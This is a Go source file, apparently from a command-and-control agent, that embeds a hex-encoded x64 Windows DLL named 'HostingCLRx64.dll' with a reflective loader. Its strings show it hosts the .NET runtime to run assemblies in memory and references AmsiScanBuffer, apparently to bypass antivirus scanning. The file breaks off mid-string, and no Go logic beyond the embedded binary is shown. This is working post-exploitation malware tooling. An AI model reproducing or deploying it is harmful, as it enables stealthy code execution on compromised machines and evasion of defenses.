package agentlab

import (
	"agentlab/modules/exec/netassembly"
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"time"
)

var (
	hostingDLL_stub = "4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f80000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000e32b61c0a74a0f93a74a0f93a74a0f939c140e92a54a0f939c140c92a44a0f939c140b92ab4a0f939c140a92b34a0f93b9189c93a54a0f93ae329c93a84a0f93a74a0e93e24a0f930d140692a34a0f930d140f92a64a0f930d14f093a64a0f930d140d92a64a0f9352696368a74a0f93000000000000000050450000648607002f065c5e0000000000000000f00022200b020e0000240000002c0000000000008824000000100000000000800100000000100000000200000500020000000000050002000000000000b0000000040000000000000300600100001000000000000010000000000000000010000000000000100000000000000000000010000000005100006400000064510000c800000000900000e00100000070000054030000000000000000000000a000004400000020470000380000000000000000000000000000000000000000000000000000006047000094000000000000000000000000400000100200000000000000000000000000000000000000000000000000002e74657874000000d1230000001000000024000000040000000000000000000000000000200000602e726461746100000619000000400000001a000000280000000000000000000000000000400000402e6461746100000038070000006000000002000000420000000000000000000000000000400000c02e7064617461000054030000007000000004000000440000000000000000000000000000400000402e6766696473000034000000008000000002000000480000000000000000000000000000400000402e72737263000000e00100000090000000020000004a0000000000000000000000000000400000402e72656c6f6300004400000000a0000000020000004c0000000000000000000000000000400000420000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040534883ec20498bd883ea01741d83fa0575524885db744d488b05f95600004989008d42fc4883c4205bc348890de656000083c9ffff15e52f000085c07506ff15e32f0000488d0d1c360000e82f000000488bcbe8e7000000488d0d30360000e81b000000b8010000004883c4205bc3488d05b1560000c3cccccccccccccccc48894c240848895424104c894424184c894c24205356574883ec30488bf9488d742458b901000000ff1532310000488bd8e8baffffff4533c948897424204c8bc7488bd3488b08ff151b3100004883c4305f5e5bc3cccccccccccccccccccccc48894c240848895424104c894424184c894c24205356574883ec30488bf9488d742458b901000000ff15d2300000488bd8e85affffff4533c948897424204c8bc7488bd3488b08ff15c33000004883c4305f5e5bc3cccccccccccccccccccccc488bc4554154415541564157488d68a84881ec3001000048c745f8feffffff488958104889701848897820488b059e4e00004833c448894528488bf948894d9833c0488945804889442468488945884889442458488944245048894424484889442440ff155f2e0000488bc8488d45a0488944242041b9080000004c8d4520488bd7ff15382e00000fb64520884424380fb64521884424390fb645228844243a0fb645238844243b0fb64524884424300fb64525884424310fb64526884424320fb6452788442433486374243048635c24384c8d3433498d4e09ff15482f00004c8be8488bceff153c2f00004c8bf84889442460488bcbff152b2f0000488bd0498bfd33c0498d4e09f3aa498bff488bcef3aa488bfa488bcbf3aa895d9033ff897d948d48114c8d45908d5001ff15552e00004c8bf0488944243848897c2478488d542478488bc8ff15422e00004983cfff85c079138bd0488d0dc9300000e83cfeffffe95f0500008d430903c64863f8ff15512d0000488bc8488d45a048894424204c8bcf4d8bc5488b5598ff152d2d0000410fb64508880532540000498d55094c8bc6488b4c2460e801200000488d56094903d54c8bc3488b4c2478e8ed1f00004533ed458bc585db7e534c8d15d43300004c8b4c24784d2bca0f1f4000498bc54b8d3c01660f1f8400000000004a8d14100fb60c17380a750f4883f809741348ffc04883f80a7ce549ffc04c3bc37d0debcb41bc01000000418bc4eb09418bc541bc01000000488d0d40300000488d1d2130000085c0480f44d9498bceff15522d000085c079138bd0488d0d35300000e848fdffffe96b0400004c8d4580488d15902f0000488d0d792f0000ff154b2e000085c079138bd0488d0d36300000e819fdffffe93c040000ff15462c0000448bc033d2b900040000ff152e2c0000488b4d80488b394c8d45a8488bd0ff573085c079138bd0488d0d20300000e8dbfcffffe9fe0300004c8d442468488b55a8488bcbe8e5040000448bf085c0755e488b4d80488b394c8d4c24684c8d05e32e0000488bd3ff571885c079138bd0488d0d10300000e893fcffffe9b6030000488b4c2468488b01488d542470ff505085c0780744396c247075138bd0488d0d12300000e865fcffffe988030000488b4c2468488b014c8d4d884c8d05b52e0000488d15be2e0000ff504885c079138bd0488d0d16300000e831fcffffe9540300004585f6750a488b4d88488b01ff505085c079138bd0488d0d28300000e80bfcffffe92e030000488b4c24584885c97406488b01ff50104c896c2458488b4d88488b01488d542458ff506885c079138bd0488d0d15300000e8d0fbffffe9f3020000488d0d3c300000e8bffbffff488b7c24584885ff750bb903400080e8eb090000cc488b4c24504885c97406488b01ff50104c896c2450488b074c8d442450488d1576310000488bcfff1085c079138bd0488d0d24300000e86ffbffffe992020000803d93510000017505e8fc020000488b7c24504885ff750bb903400080e888090000cc488b4c24484885c97406488b01ff50104c896c2448488b074c8d442448488b542438488bcfff906801000085c079138bd0488d0def2f0000e80afbffffe92d020000488b7c24484885ff750bb903400080e831090000cc488b4c24404885c97406488b01ff50104c896c2440488b07488d542440488bcfff908000000085c079138bd0488d0dcd2f0000e8b8faffffe9db01000033c0488945e0488945e8488945f0488945b0488945b8488945c066448965b0b808200000668945c8488b5c2460b90c00000033d244382b0f8434010000458bc4ff156d2a00004c8be0488d0c7501000000ff15e42a0000488bf8ffc64c63c6488bd3488bc8ff15c02a0000488d542430488bcfff154a2a00004c8bf0488bcfff15be2a0000b908000000448b44243033d2ff151c2a0000488945d0418bcd894c2438394c24300f8eac0000000f1f80000000004863c1498b0cc6498bf7660f1f44000048ffc66644392c7175f648ffc6b80200000048f7e6490f40c7488bc8e8230a0000488bf8488bceff154b2a0000488bd848635424384c8bc6498b14d6488bc8ff151b2a000048897424204c8bcb4c8bc6488bd7488d4d98ff15fb290000488bcfff156a2900004c8bc0488d542438488b4dd0ff1550290000488bcbff15ff2900008b4c2438ffc1894c24383b4c24300f8c5bffffff44896c24604c8d45c8488d542460498bccff151c290000eb0c4533c0ff15392900004c8be00f1045b00f294500f20f104dc0f20f114d10488b4c24404885c9750bb903400080e850070000cc488b014c8d4de04d8bc4488d5500ff902801000085c079108bd0488d0d2e2e0000e8e9f8ffffeb0f488d0d502e0000e87bf8ffff458bfd488b4c24404885c97407488b01ff501090488b4c24484885c97407488b01ff501090488b4c24504885c97407488b11ff521090488b4c24584885c97406488b11ff5210418bc7488b4d284833cce8b60800004c8d9c2430010000498b5b38498b7340498b7b48498be3415f415e415d415c5dc3cccccccccc40534883ec20488d0d232e0000ff159d270000488bc8488d15232e0000ff1595270000ba060000004c8d4c2430488bc8488bd8448d423aff15832700008b0d814700004c8d4c2430890bba060000000fb70d7247000066894b04488bcb448b442430ff1558270000b8010000004883c4205bc3cccccccccccccccccccccccccc48895c2408574881ec60020000488b05fc4600004833c44889842450020000488b024c8d4c2420488bda4c89442428488bf9c7442420000000004c8d442428ba01000000488bcbff501885c078666690837c242000765d488b4c24284c8d442430488d542440488b01ff501885c07828488d4424404c8bc74c2bc00f1f4400000fb710420fb70c002bd175084883c00285c975ec85d2743f488b034c8d4c24204c8d442428ba01000000488bcbff501885c0799c33c0488b8c24500200004833cce84a070000488b9c24700200004881c4600200005fc3b801000000ebd8cccc488b094885c97407488b0148ff6010c3488b0424c3cccccccccccccccccccccc48894c240853415641574883ec5048896c24484533ff48897424404533c94c8964243033f64533e44c896c242833ed4c89bc24800000004c894c2478e8afffffff4c8be8b84d5a00000f1f80000000006641394500751b4963553c488d4ac04881f9bf030000770a42813c2a50450000740549ffcdebd965488b04256000000041bb0100000048897c24384c89ac2488000000488b48184c8b71204d85f60f840b020000418d5b0341baffff00006690498b565033c9450fb746480f1f4400000fb602c1c90d3c61720a0fb6c083e8204898eb030fb6c04803c848ffc2664503c275dd81f95bbc4a6a0f85f00000004d8b4e2041bdffff00004963413c428bbc0888000000468b540f20468b5c0f244d03d14d03d96666660f1f840000000000418b0a4903c94533c00fb6010f1f400041c1c80d488d49010fbec04403c00fb60184c075eb4181f88e4e0eec741b4181f8aafc0d7c74124181f854caaf9174094181f8f232f60e7555428b440f1c410fb713498d0c014181f88e4e0eec7509448b3c914d03f9eb324181f8aafc0d7c7509448b24914d03e1eb204181f854caaf9175088b34914903f1eb0f4181f8f232f60e75068b2c914903e9664103dd4983c2044983c3026685db0f8551ffffff4c89bc2480000000458bd5e99400000081f95d68fa3c0f85970000004d8b562041bfffff00004963423c428b9c1088000000468b441320468b4c13244d03c24d03ca418b104903d233c90fb6020f1f4000c1c90d488d52010fbec003c80fb60284c075ed81f9b80a4c53751c428b44131c410fb711498d0c028b3c914903fa48897c2478664503df4983c0044983c102664585db75ac4c8bbc248000000041baffff00004c8b4c247841bb01000000418d5b034d85ff74144d85e4740f4885f6740a4885ed74054d85c9750c4d8b364d85f60f8509feffff4c8bac24880000004d637d3c33c94d03fd41b800300000448d4940418b5750ffd6418b5750488bc84c8bf0ffd5418b5754498bcd4885d274204d8bc64d2bc566660f1f8400000000000fb6014188040848ffc14883ea0175f0450fb75706410fb747144d85d2744c4d8d4f2c4c03c866660f1f840000000000418b49f849ffca418b114903ce458b41fc4903d54d85c074190f1f80000000000fb602488d5201880148ffc14983e80175ee4983c1284d85d275c5418baf900000004903ee837d00000f849b0000004c8bac24800000008b4d0c4903ce41ffd5488bf04885c074748b7d108b5d004903fe4903de48833f007462660f1f4400004885db742c488b134885d279244863463c0fb7d28b8c30880000008b4431108b4c311c482bd04803ce8b04914803c6eb10488b17488bce4883c2024903d641ffd44889074883c7084885db488d4308480f44c348833f00488bd875a44883c514837d00000f856dffffff4c8b6c24284d8bc64d2b47304183bfb4000000004c8b642430488b7c2438488b742440488b6c24480f84af000000458b9fb00000004d03de418b430485c00f84990000006690418b134d8d5308448bc84903d64983e90849d1e9746e66660f1f840000000000410fb70249ffc90fb7c866c1e90c6683f90a750b25ff0f00004c010410eb3c6683f903750b25ff0f000044010410eb2b6683f901751525ff0f0000488d0c10498bc048c1e810660101eb106683f902750a25ff0f000066440104104983c2024d85c9759c418b43044c03d8418b430485c00f8569ffffff418b5f284533c033d24883c9ff4903deff5424784c8b442470ba01000000498bceffd3488bc34883c450415f415e5bc3cccccccccccccccccc48895c2408574883ec20488b1dcf4000008bf9488bcbe88d05000033d28bcf488bc3488b5c24304883c4205f48ffe0cc4889742410574883ec20488d05ff220000488bf94889018b4208894108488b421048894110488bf048c74118000000004885c0741e488b0048895c2430488b5808488bcbe82f050000488bceffd3488b5c2430488bc7488b7424384883c4205fc3cccccccccccccccccccccccccccccc4889742410574883ec20895108488d058c220000488901498bf04c894110488bf948c74118000000004d85c074234584c9741e498b0048895c2430488b5808488bcbe8c1040000488bceffd3488b5c2430488bc7488b7424384883c4205fc3cc4883ec284889742438488d0530220000488b711048897c2420488bf94889014885f6741e488b0648895c2430488b5810488bcbe870040000488bceffd3488b5c2430488b4f18488b7c2420488b7424384885c9740b4883c42848ff25282000004883c428c3cccccccccccccccccccccc48895c2408574883ec208bda488bf9e87cfffffff6c301740dba20000000488bcfe81a040000488bc7488b5c24304883c4205fc3cccccccccccccccccccccccc4883ec484c8bc24533c98bd1488d4c2420e8dafeffff488d15cb2e0000488d4c2420e8f9100000cccccccccccccccccccccccccccccc66660f1f840000000000483b0df93e0000f2751248c1c11066f7c1fffff27502f2c348c1c910e977040000cccccce9b7050000cccccc4883ec2885d2743983ea01742883ea01741683fa01740ab8010000004883c428c3e87a060000eb05e84b0600000fb6c04883c428c3498bd04883c428e90f0000004d85c00f95c14883c428e92c01000048895c2408488974241048897c242041564883ec20488bf24c8bf133c9e8ee06000084c0750733c0e9e8000000e86e0500008ad88844244040b701833dd244000000740ab907000000e8220a0000c705bc44000001000000e8b305000084c07467e8520b0000488d0d970b0000e8f2080000e8b1090000488d0dba090000e8e1080000e8c4090000488d151d200000488d0d0e200000e8ff0f000085c07529e83805000084c07420488d15ed1f0000488d0dde1f0000e8d90f0000c7054f440000020000004032ff8acbe8f50700004084ff0f854effffffe88b090000488bd8488338007424488bc8e83a07000084c07418488b1b488bcbe83f0200004c8bc6ba02000000498bceffd3ff05843e0000b801000000488b5c2430488b742438488b7c24484883c420415ec3cc48895c24084889742418574883ec20408af18b05503e000033db85c07f0433c0eb50ffc889053e3e0000e845040000408af888442438833dab43000002740ab907000000e8fb080000e852050000891d94430000e877050000408acfe83707000033d2408acee85107000084c00f95c38bc3488b5c2430488b7424404883c4205fc3cccc488bc4488958204c89401889501048894808565741564883ec40498bf08bfa4c8bf185d2750f3915b83d00007f0733c0e9b20000008d42ff83f801772ae8b60000008bd88944243085c00f848d0000004c8bc68bd7498bcee8a3fdffff8bd88944243085c074764c8bc68bd7498bcee850ecffff8bd88944243083ff01752b85c075274c8bc633d2498bcee834ecffff4c8bc633d2498bcee863fdffff4c8bc633d2498bcee84e00000085ff740583ff03752a4c8bc68bd7498bcee840fdffff8bd88944243085c074134c8bc68bd7498bcee8210000008bd889442430eb0633db895c24308bc3488b5c24784883c440415e5f5ec3cccccc48895c240848896c24104889742418574883ec20488b1d191e0000498bf88bf2488be94885db75058d4301eb12488bcbe85f0000004c8bc78bd6488bcdffd3488b5c2430488b6c2438488b7424404883c4205fc348895c24084889742410574883ec20498bf88bda488bf183fa017505e85f0600004c8bc78bd3488bce488b5c2430488b7424384883c4205fe977feffffcccccc48ff25411d0000cce90b090000cccccc40534883ec20488d05931d0000488bd9488901f6c201740aba18000000e8d6ffffff488bc34883c4205bc3cccccccccccccccccccccccccccccccccccccc66660f1f8400000000004883ec104c8914244c895c24084d33db4c8d5424184c2bd04d0f42d3654c8b1c25100000004d3bd3f27317664181e200f04d8d9b00f0ffff41c603004d3bd3f275ef4c8b14244c8b5c24084883c410f2c3cccccc40534883ec20488bd933c9ff15e31a0000488bcbff15d21a0000ff15741a0000488bc8ba090400c04883c4205b48ff25c81a000048894c24084883ec38b917000000e8a70c000085c07407b902000000cd29488d0d033c0000e8aa000000488b442438488905ea3c0000488d4424384883c0084889057a3c0000488b05d33c0000488905443b0000488b442440488905483c0000c7051e3b0000090400c0c705183b000001000000c705223b000001000000b808000000486bc000488d0d1a3b000048c7040102000000b808000000486bc000488b0dc239000048894c0420b808000000486bc001488b0db539000048894c0420488d0d111c0000e800ffffff4883c438c3cccccc405356574883ec40488bd9ff15bb190000488bb3f800000033ff4533c0488d542460488bceff15a91900004885c07439488364243800488d4c2468488b5424604c8bc848894c24304c8bc6488d4c247048894c242833c948895c2420ff157a190000ffc783ff027cb14883c4405f5e5bc3cccccc40534883ec20488bd9eb21488bcbe8290b000085c075124883fbff7507e8c2080000eb05e89b080000488bcbe8f90a00004885c074d54883c4205bc34883ec28e8a30a000085c0742165488b042530000000488b4808eb05483bc8741433c0f0480fb10d503f000075ee32c04883c428c3b001ebf7cccccc4883ec28e8670a000085c07407e88e080000eb19e84f0a00008bc8e8b00a000085c0740432c0eb07e8a90a0000b0014883c428c34883ec2833c9e84101000084c00f95c04883c428c3cccccc4883ec28e8ab0a000084c0750432c0eb12e89e0a000084c07507e8950a0000ebecb0014883c428c34883ec28e8830a0000e87e0a0000b0014883c428c3cccccc48895c240848896c24104889742418574883ec20498bf9498bf08bda488be9e8c009000085c0751783fb017512488bcfe89ffcffff4c8bc633d2488bcdffd7488b5424588b4c2450488b5c2430488b6c2438488b7424404883c4205fe9dd090000cccccc4883ec28e87709000085c07410488d0d443e00004883c428e9db090000e8f209000085c07505e8d90900004883c428c34883ec2833c9e8d50900004883c428e9cc09000040534883ec200fb605373e000085c9bb010000000f44c38805273e0000e84a070000e8a509000084c0750432c0eb14e89809000084c0750933c9e88d090000ebea8ac34883c4205bc3cccccc48895c240855488bec4883ec408bd983f9010f87a6000000e8d308000085c0742b85db7527488d0d9c3d0000e82b09000085c0740432c0eb7a488d0da03d0000e81709000085c00f94c0eb67488b15d53600004983c8ff8bc2b94000000083e03f2bc8b00149d3c84c33c24c8945e04c8945e80f1045e04c8945f0f20f104df00f1105413d00004c8945e04c8945e80f1045e04c8945f0f20f110d393d0000f20f104df00f1105353d0000f20f110d3d3d0000488b5c24504883c4405dc3b905000000e84c020000cccccccc4883ec184c8bc1b84d5a000066390539d6ffff75794863056cd6ffff488d1529d6ffff488d0c10813950450000755fb80b0200006639411875544c2bc20fb74114488d51184803d00fb74106488d0c804c8d0cca48891424493bd174188b4a0c4c3bc1720a8b420803c14c3bc072084883c228ebdf33d24885d2750432c0eb14837a24007d0432c0eb0ab001eb0632c0eb0232c04883c418c3cccccc40534883ec208ad9e87b07000033d285c0740b84db75074887153a3c00004883c4205bc340534883ec20803d5f3c0000008ad9740484d2750e8acbe8d80700008acbe8d1070000b0014883c4205bc3cc40534883ec20488b1563350000488bd98bca483315f73b000083e13f48d3ca4883faff750a488bcbe889070000eb0f488bd3488d0dd73b0000e86c07000033c985c0480f44cb488bc14883c4205bc3cc4883ec28e8a7ffffff48f7d81bc0f7d8ffc84883c428c3cc48895c242055488bec4883ec20488365180048bb32a2df2d992b0000488b05e5340000483bc3756f488d4d18ff1556150000488b451848894510ff15401500008bc048314510ff15c41400008bc0488d4d2048314510ff151c1500008b4520488d4d1048c1e02048334520483345104833c148b9ffffffffffff00004823c148b933a2df2d992b0000483bc3480f44c148890571340000488b5c244848f7d04889056a3400004883c4205dc3488d0d353b000048ff25d6140000cccc488d0d253b0000e932060000488d05293b0000c34883ec28e88fe4ffff48830804e8e6ffffff488308024883c428c3cc488d05353b0000c348895c240855488dac2440fbffff4881ecc00500008bd9b917000000e84506000085c074048bcbcd298325dc3a000000488d4df033d241b8d0040000e8b9050000488d4df0ff1501140000488b9de8000000488d95d8040000488bcb4533c0ff15ef1300004885c0743c488364243800488d8de0040000488b95d80400004c8bc848894c24304c8bc3488d8de804000048894c2428488d4df048894c242033c9ff15b6130000488b85c8040000488d4c2450488985e800000033d2488d85c804000041b8980000004883c00848898588000000e822050000488b85c80400004889442460c744245015000040c744245401000000ff15aa13000083f801488d4424504889442440488d45f00f94c3488944244833c9ff1551130000488d4c2440ff153e13000085c0750af6db1bc02105d8390000488b9c24d00500004881c4c00500005dc3cccccc48895c24084889742410574883ec20488d1d261f0000488d351f1f0000eb16488b3b4885ff740a488bcfe855f7ffffffd74883c308483bde72e5488b5c2430488b7424384883c4205fc3cccc48895c24084889742410574883ec20488d1dea1e0000488d35e31e0000eb16488b3b4885ff740a488bcfe809f7ffffffd74883c308483bde72e5488b5c2430488b7424384883c4205fc3ccccc20000cce92f040000cccccc4883ec284d8b4138488bca498bd1e80d000000b8010000004883c428c3cccccc4053458b18488bda4183e3f84c8bc941f600044c8bd17413418b40084d635004f7d84c03d14863c84c23d14963c34a8b1410488b43108b480848034b08f641030f740a0fb6410383e0f04c03c84c33ca498bc95be9aff2ffffcccccc40534883ec20488bd9488bc2488d0d2114000048890b488d530833c948890a48894a08488d4808e878030000488d0531140000488903488bc34883c4205bc3cc33c048894110488d052714000048894108488d050c140000488901488bc1c3cc40534883ec20488bd9488bc2488d0dc113000048890b488d530833c948890a48894a08488d4808e818030000488d05f9130000488903488bc34883c4205bc3cc33c048894110488d05ef13000048894108488d05d4130000488901488bc1c3cc40534883ec20488bd9488bc2488d0d6113000048890b488d530833c948890a48894a08488d4808e8b8020000488bc34883c4205bc3cccccc488d05351300004889014883c108e99f020000cc48895c2408574883ec20488d0517130000488bf94889018bda4883c108e87c020000f6c301740dba18000000488bcfe82cf5ffff488bc7488b5c24304883c4205fc3cccc4883ec48488d4c2420e8e2feffff488d1547200000488d4c2420e81d020000cc4883ec48488d4c2420e822ffffff488d15af200000488d4c2420e8fd010000cc4883790800488d05a8120000480f454108c3cccc48895c241048897c241855488bec4883ec208365e80033c933c0c70500300000020000000fa2448bc1c705ed2f00000100000081f163414d44448bca448bd24181f1656e74694181f2696e65494181f06e74656c450bd0448bdb448b05a33600004181f341757468450bd98bd3440bd981f247656e7533c98bf8440bd2b8010000000fa28945f0448bc944894df88bc8895df48955fc4585d2755248830d852f0000ff4183c80425f03fff0f448905513600003dc006010074283d6006020074213d70060200741a05b0f9fcff83f820771b48bb0100010001000000480fa3c3730b4183c801448905173600004585db751981e1000ff00f81f9000f6000720b4183c804448905f9350000b8070000008955e044894de43bf87c2433c90fa28945f0895df4894df88955fc895de80fbae309730b4183c802448905c5350000410fbae114736ec705d02e000002000000c705ca2e000006000000410fbae11b7353410fbae11c734c33c90f01d048c1e220480bd048895510488b451024063c0675328b059c2e000083c808c7058b2e000003000000f645e8208905852e0000741383c820c705722e0000050000008905702e0000488b5c243833c0488b7c24404883c4205dc3ccccb801000000c3cccc33c03905602e00000f95c0c3ccccccccccccccccccccccccff25120f0000ff25140f0000ff25160f0000ff25180f0000ff252a0f0000ff25140f0000ff25560f0000ff25480f0000ff259a0f0000ff258c0f0000ff25460f0000ff25980f0000ff256a0f0000ff255c0f0000ff254e0f0000ff25400f0000ff25320f0000ff25540f0000ff25660f0000ff25100e0000b001c3cc33c0c3cc488bc44889580848896810488970184889782041564883ec20498b5938488bf24d8bf0488be9498bd1488bce498bf94c8d4304e860fbffff8b45042466f6d8b801000000451bc041f7d84403c04485430474114c8bcf4d8bc6488bd6488bcde822000000488b5c2430488b6c2438488b742440488b7c24484883c420415ec3ccff253a0e0000ff25040e0000cccccccccccccccccccc66660f1f840000000000ffe0cccccccccccccccccccccccccccc488d8a58000000e9b4e6ffff488d8a50000000e9a8e6ffff488d8a48000000e99ce6ffff488d8a40000000e990e6ffff40554883ec20488bea8a4d404883c4205de9eaf6ffffcc40554883ec20488beae813f5ffff8a4d384883c4205de9cef6ffffcc40554883ec30488bea488b018b1048894c2428895424204c8d0d9bedffff4c8b45708b5568488b4d60e843f4ffff904883c4305dc3cc4055488bea488b0133c98138050000c00f94c18bc15dc3cc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040540000000000005454000000000000685400000000000076540000000000008c540000000000009c54000000000000ac54000000000000bc54000000000000ce54000000000000c657000000000000da57000000000000f457000000000000085800000000000024580000000000004258000000000000565800000000000072580000000000008c58000000000000a258000000000000bc58000000000000d258000000000000ba5700000000000000000000000000001a0000000000008002000000000000800f00000000000080170000000000008018000000000000809b010000000000800000000000000000ee540000000000000000000000000000f0580000000000003e5500000000000054550000000000005e550000000000007655000000000000ae55000000000000e658000000000000965500000000000000000000000000004c560000000000004056000000000000345600000000000000000000000000002a560000000000002256000000000000745600000000000000000000000000000657000000000000ea56000000000000ce56000000000000ac5600000000000092560000000000001e5700000000000066560000000000005a560000000000002c5700000000000080560000000000000000000000000000f655000000000000da55000000000000085600000000000000000000000000001e550000000000000000000000000000dc2d00800100000010330080010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000090200080010000000000000000000000f847008001000000d8240080010000003061008001000000d0610080010000007048008001000000702f008001000000f42f008001000000556e6b6e6f776e20657863657074696f6e00000000000000e848008001000000702f008001000000f42f00800100000062616420616c6c6f636174696f6e00006849008001000000702f008001000000f42f008001000000626164206172726179206e6577206c656e67746800000000d2d139bd2fba6a4889b0b4b0cb4668918d1880928e0e6748b30c7fa83884e8de9edb32d3b3b925418207a14884f5321622672fcb3aabd2119c4000c04fa30a3e23672fcb3aabd2119c4000c04fa30a3e4661696c6564205361666541727261794163636573734461746120772f68722030782530386c780a0000000000000000760034002e0030002e003300300033003100390000000000760032002e0030002e0035003000370032003700000000004661696c656420536166654172726179556e6163636573734461746120772f68722030782530386c780a000000000000434c52437265617465496e7374616e6365206661696c656420772f68722030782530386c780a0000704d657461486f73742d3e456e756d65726174654c6f6164656452756e74696d6573206661696c656420772f68722030782530386c780a0049434c524d657461486f73743a3a47657452756e74696d65206661696c656420772f68722030782530386c780a00000049434c5252756e74696d65496e666f3a3a49734c6f616461626c65206661696c656420772f68722030782530386c780a000000000000000049434c5252756e74696d65496e666f3a3a476574496e74657266616365206661696c656420772f68722030782530386c780a000000000000434c52206661696c656420746f20737461727420772f68722030782530386c780a0000000000000049436f7252756e74696d65486f73743a3a47657444656661756c74446f6d61696e206661696c656420772f68722030782530386c780a000049436f7252756e74696d65486f73742d3e47657444656661756c74446f6d61696e282e2e2e29207375636365656465640a000000000000004661696c656420746f206765742064656661756c7420417070446f6d61696e20772f68722030782530386c780a0000004661696c6564207044656661756c74417070446f6d61696e2d3e4c6f61645f3320772f68722030782530386c780a00004661696c65642070417373656d626c792d3e6765745f456e747279506f696e7420772f68722030782530386c780a00004661696c656420704d6574686f64496e666f2d3e496e766f6b655f332020772f68722030782530386c780a00000000005300750063006300650065006400650064000a000000000045007800650063007500740069006f006e00200073007400610072007400650064000a000000000045007800650063007500740069006f006e00200065006e0064000a0000000000616d73692e646c6c0000000000000000416d73695363616e4275666665720000dc96f605292b6336ad8bc4389cf2a713060000000000000076342e302e33303331390000000000002205931904000000e04c0000000000000000000009000000004d0000f80000000000000001000000000000002f065c5e000000000d0000008c020000ec490000ec310000000000002f065c5e000000000e000000000000000000000000000000000000000000000094000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000106000800100000000000000000000000000000000000000104200800100000018420080010000000000000000000000000000000000000000010000000000000100000000000000000000007860000020480000f84700000000000000000000000000000000000000000000000000000100000038480000000000000000000048480000000000000000000000000000786000000000000000000000ffffffff000000004000000020480000000000000000000000000000010000000000000000000000c0600000984800007048000000000000000000000000000000000000000000000000000001000000b04800000000000000000000c0480000000000000000000000000000c06000000000000000000000ffffffff0000000040000000984800000000000000000000000000000100000000000000000000009860000010490000e84800000000000000000000000000000000000000000000000000000200000028490000000000000000000040490000c048000000000000000000000000000000000000986000000100000000000000ffffffff000000004000000010490000000000000000000000000000010000000000000000000000e8600000904900006849000000000000000000000000000000000000000000000000000003000000a84900000000000000000000c849000040490000c04800000000000000000000000000000000000000000000e86000000200000000000000ffffffff00000000400000009049000000000000000000004743544c00100000002300002e74657874246d6e0000000000330000200000002e74657874246d6e2430300020330000b10000002e7465787424780000400000100200002e696461746124350000000010420000100000002e3030636667000020420000080000002e435254245843410000000028420000080000002e4352542458435a0000000030420000080000002e435254245849410000000038420000080000002e4352542458495a0000000040420000080000002e435254245850410000000048420000080000002e4352542458505a0000000050420000080000002e435254245854410000000058420000080000002e4352542458545a0000000060420000980500002e72646174610000f8470000f40100002e7264617461247200000000ec4900008c0200002e7264617461247a7a7a646267000000784c0000080000002e7274632449414100000000804c0000080000002e72746324495a5a00000000884c0000080000002e7274632454414100000000904c0000100000002e72746324545a5a00000000a04c0000180300002e78646174610000b84f0000480100002e786461746124780000000000510000640000002e6564617461000064510000b40000002e696461746124320000000018520000180000002e696461746124330000000030520000100200002e696461746124340000000040540000c60400002e696461746124360000000000600000500000002e6461746100000050600000d00000002e6461746124720020610000180600002e6273730000000000700000540300002e7064617461000000800000340000002e676669647324790000000000900000600000002e727372632430310000000060900000800100002e7273726324303200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000106020006320230011b04001b5217701660153019390d002b742f0027642e0023342d00170126000cf00ae008d006c00450000070320000f84600002a010000ffffffff20330000000000002c3300000100000038330000020000004433000040110000ffffffff941100000000000099110000010000009e11000002000000a311000003000000081800000200000019180000010000002a180000000000003b180000ffffffff191f05000d344e000d014c0006700000e82d000050020000010e04000e920af008e00630217d0a007d7407001fd4050015c406000d64080005540900001a00000e1a0000604d000021000000001a00000e1a0000604d000001040100048200002105020005340600c01f0000f61f0000cc4d000021000000c01f0000f61f0000cc4d0000010a04000a6407000a3206702105020005340600501f0000881f0000cc4d000021000000501f0000881f0000cc4d000021150400157404000564070020200000242000004c4f000021050200053406002420000047200000fc4d0000210000002420000047200000fc4d00002100000020200000242000004c4f00000100000011150800157409001564070015340600153211e0fc31000001000000c7210000542200005033000000000000110f06000f6408000f3406000f320b70fc31000001000000ee2200000c23000067330000000000000106020006320250091a06001a340f001a7216e014701360fc31000001000000712300001b240000833300001b2400000106020006520250010f06000f6407000f3406000f320b70010401000412000001090100096200000108040008720470036002300904010004220000fc31000001000000bb290000462a0000b9330000462a00000102010002500000010d04000d340a000d72065001140800146408001454070014340600143210700104010004420000010d04000d3409000d320650011505001534ba001501b800065000000102010002300000010a04000a3406000a32067001120600127408001234070012320b50000000000100000001190a0019740900196408001954070019340600193215e000000000000000002020000000000000d84f00000000000000000000000000000000000001000000e84f00000000000000000000000000005060000000000000ffffffff0000000020000000501f0000000000000000000000000000000000005c2f0000000000003050000000000000000000000000000000000000020000004850000070500000000000000000000000000000100000009860000000000000ffffffff0000000018000000642e000000000000000000000000000000000000c060000000000000ffffffff0000000018000000242f0000000000000000000000000000000000005c2f000000000000b85000000000000000000000000000000000000003000000d850000048500000705000000000000000000000000000000000000000000000e860000000000000ffffffff0000000018000000c42e0000000000000000000000000000000000002f065c5e0000000032510000010000000100000001000000285100002c51000030510000001a0000445100000000486f7374696e67434c527836342e646c6c003f5265666c6563746976654c6f61646572404059415f4b50454158405a000000305200000000000000000000e05400000040000020530000000000000000000004550000f0400000e8520000000000000000000010550000b84000003054000000000000000000003255000000420000305300000000000000000000c85500000041000010540000000000000000000036570000e041000098530000000000000000000056570000684100007853000000000000000000007657000048410000b85300000000000000000000985700008841000000000000000000000000000000000000000000000000000040540000000000005454000000000000685400000000000076540000000000008c540000000000009c54000000000000ac54000000000000bc54000000000000ce54000000000000c657000000000000da57000000000000f457000000000000085800000000000024580000000000004258000000000000565800000000000072580000000000008c58000000000000a258000000000000bc58000000000000d258000000000000ba5700000000000000000000000000001a0000000000008002000000000000800f00000000000080170000000000008018000000000000809b010000000000800000000000000000ee540000000000000000000000000000f0580000000000003e5500000000000054550000000000005e550000000000007655000000000000ae55000000000000e65800000000000096550000000000000000000000000